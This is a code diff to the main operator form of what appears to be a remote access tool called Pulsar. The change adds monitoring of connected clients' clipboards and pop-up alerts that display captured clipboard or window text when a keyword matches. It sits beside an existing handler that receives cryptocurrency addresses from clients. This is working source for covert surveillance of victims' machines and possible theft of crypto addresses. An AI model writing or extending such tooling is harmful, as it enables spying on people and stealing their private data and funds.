@@ -86,8 +86,8 @@ namespace Pulsar.Server.Forms
                 this.Invoke(new Action(() => OnLogReceived(sender, client, log)));
                 return;
             }
-        }
-
+        }        
+        
         private void RegisterMessageHandler()
         {
             MessageHandler.Register(_clientDebugLogHandler);
@@ -96,10 +96,11 @@ namespace Pulsar.Server.Forms
             _clientStatusHandler.StatusUpdated += SetStatusByClient;
             _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;
             _clientStatusHandler.UserActiveWindowStatusUpdated += SetUserActiveWindowByClient;
+            _clientStatusHandler.UserClipboardStatusUpdated += SetUserClipboardByClient;
             MessageHandler.Register(_getCryptoAddressHander);
             _getCryptoAddressHander.AddressReceived += OnAddressReceived;
-        }
-
+        }        
+        
         private void UnregisterMessageHandler()
         {
             MessageHandler.Unregister(_clientDebugLogHandler);
@@ -108,6 +109,7 @@ namespace Pulsar.Server.Forms
             _clientStatusHandler.StatusUpdated -= SetStatusByClient;
             _clientStatusHandler.UserStatusUpdated -= SetUserStatusByClient;
             _clientStatusHandler.UserActiveWindowStatusUpdated -= SetUserActiveWindowByClient;
+            _clientStatusHandler.UserClipboardStatusUpdated -= SetUserClipboardByClient;
             MessageHandler.Unregister(_getCryptoAddressHander);
             _getCryptoAddressHander.AddressReceived -= OnAddressReceived;
         }
@@ -1006,13 +1008,18 @@ namespace Pulsar.Server.Forms
             var item = GetListViewItemByClient(client);
             if (item != null)
                 item.SubItems[USERSTATUS_ID].Text = userStatus.ToString();
-        }
-
+        }        
+        
         private void SetUserActiveWindowByClient(object sender, Client client, string newWindow)
         {
             var item = GetListViewItemByClient(client);
             if (item != null)
                 item.SubItems[CURRENTWINDOW_ID].Text = newWindow;
+        }
+
+        private void SetUserClipboardByClient(object sender, Client client, string clipboardText)
+        {
+            // looks clean
         }
 
         private ListViewItem GetListViewItemByClient(Client client)
@@ -1687,8 +1694,8 @@ namespace Pulsar.Server.Forms
             {
                 frm.ShowDialog();
             }
-        }
-
+        }        
+        
         public static void AddNotiEvent(FrmMain frmMain, string client, string keywords, string windowText)
         {
             if (frmMain.lstNoti.InvokeRequired)
@@ -1699,11 +1706,33 @@ namespace Pulsar.Server.Forms
             ListViewItem item = new ListViewItem(client);
             item.SubItems.Add(DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"));
             item.SubItems.Add(keywords);
-            item.SubItems.Add(windowText);
+            
+            // truncate
+            string displayText = windowText;
+            if (windowText.Length > 100)
+            {
+                displayText = windowText.Substring(0, 100) + "...";
+            }
+            item.SubItems.Add(displayText);
+            
+            item.ToolTipText = windowText;
+            
             frmMain.lstNoti.Items.Add(item);
 
+            string notificationTitle = $"Keyword Triggered: {keywords}";
+            string notificationText;
+            
+            if (keywords.Contains("(Clipboard)"))
+            {
+                notificationText = $"Client: {client}\nClipboard: {(windowText.Length > 50 ? windowText.Substring(0, 50) + "..." : windowText)}";
+            }
+            else
+            {
+                notificationText = $"Client: {client}\nWindow: {windowText}";
+            }
+
             frmMain.notifyIcon.Visible = true;
-            frmMain.notifyIcon.ShowBalloonTip(4000, $"Keyword Triggered: {keywords}", $"Client: {client}\nWindow: {windowText}", ToolTipIcon.Info);
+            frmMain.notifyIcon.ShowBalloonTip(4000, notificationTitle, notificationText, ToolTipIcon.Info);
             frmMain.notifyIcon.Visible = false;
         }
 
